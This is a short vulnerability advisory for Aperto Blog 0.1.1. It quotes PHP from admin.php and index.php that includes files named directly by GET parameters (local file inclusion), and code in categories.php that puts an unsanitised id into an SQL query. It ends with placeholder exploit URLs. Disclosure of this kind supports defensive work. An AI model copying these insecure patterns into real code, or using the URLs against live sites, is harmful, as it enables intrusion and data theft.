Aperto Blog 0.1.1 Local File Inclusion / SQL Injection Vulnerabilities
======================================================================

===========================================================================================================
 
 
  [o] Aperto Blog 0.1.1 Local File Inclusion and SQL Injection Vulnerabilities
 
       Software : Aperto Blog version 0.1.1
       Vendor   : http://code.google.com/p/apertoblog/
       Download : http://code.google.com/p/apertoblog/downloads/list
       Author   : NoGe 
 
===========================================================================================================
 
 
  [o] Vulnerable file
 
       admin.php
 
        if(isset($_GET[&#039;action&#039;])) {
        if($_GET[&#039;action&#039;]=="logout") {
        session_destroy();
        go(&#039;index.php&#039;);
        } else {
        if(file_exists($_GET[&#039;action&#039;].".php")) {
        include($_GET[&#039;action&#039;].".php");
        } else {
        echo "404";
 
       index.php
 
        if(!$_GET[&#039;get&#039;]) {
        $articles = mysql_query("SELECT * FROM articles ORDER BY id DESC LIMIT 10");
        while($row = mysql_fetch_array($articles)) {
        showarticle($row, $settings[5]);
        }
        } elseif(file_exists($_GET[&#039;get&#039;].".php")) {
        include($_GET[&#039;get&#039;].".php");
        } else {
        echo "404";
 
       categories.php
 
        if(isset($_GET[&#039;id&#039;])) {
        $cid = $_GET[&#039;id&#039;];
        //Load category info
        $getcat = mysql_query("SELECT * FROM categories WHERE id=&#039;$cid&#039;");
 
 
 
  [o] Exploit
 
       [ Local File Inclusion ]
 
     http://localhost/[path]/admin.php?action=[LFI]
     http://localhost/[path]/index.php?get=[LFI]
 
       [ SQL Injection ]
 
     http://localhost/[path]/categories.php?id=[SQL]
 
 
===========================================================================================================
 


